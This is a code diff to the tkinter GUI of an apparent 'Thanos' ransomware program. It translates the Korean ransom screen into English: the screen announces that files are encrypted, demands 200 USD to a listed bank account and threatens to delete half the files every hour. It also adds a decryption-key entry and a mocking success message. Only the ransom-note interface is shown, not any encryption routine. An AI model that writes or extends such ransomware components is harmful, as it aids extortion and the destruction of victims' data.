@@ -60,7 +60,9 @@ class MyTk:
         self.window.configure(background="black")
 
         self.l_text = tkinter.Label(self.window,
-                                    text="\n타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\n",
+                                    text="\nYour computer files have been encrypted.\nYour photos, documents, etc...\nBut, don't worry! I have not deleted them yet :D"
+                                         "\nYou have some time to pay 200USD in this accoutn(KB 786102-00-040854) to get the decryption key\n"
+                                         "Every hour half of all files will be deleted.\n",
                                     fg="red", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
 
@@ -75,7 +77,7 @@ class MyTk:
         self.password = tkinter.Entry(self.window)
         self.password.pack()
 
-        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.keySubmit,disabledforeground='red')
+        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit,disabledforeground='red')
         self.pwbutton.pack()
 
         self.thanos = tkinter.PhotoImage(file="../ui/face.png")
@@ -88,13 +90,13 @@ class MyTk:
         # 틀린 시도를 해도 그냥 그대로 두어도 된다고 저번 회의때 얘기했었으니까!
         self.pw = str(self.password.get())
 
-        self.l_input.config(text=" 키 확인중 ... ")  # 이거 왜 안뜨는거지..?
+        self.l_input.config(text=" The keys are being checked ... ")  # 이거 왜 안뜨는거지..?
         self.pwbutton.config(state='disabled')
 
         self.parent and self.parent.checkPassword(self.pw)
 
         self.pwbutton.config(state='normal')
-        self.l_input.config(text=" 틀린 키이다 ")
+        self.l_input.config(text=" It's the wrong key.")
 
 
     def imageChange(self):
@@ -116,7 +118,7 @@ class MyTk:
         self.pwbutton.destroy()
         self.l_thanos.destroy()
 
-        self.l_text.config(text="\n고맙습니다 고갱님^^ 복호화 완료되었습니당~!\n\n", font='Helvetica 16 bold')
+        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
 
         self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
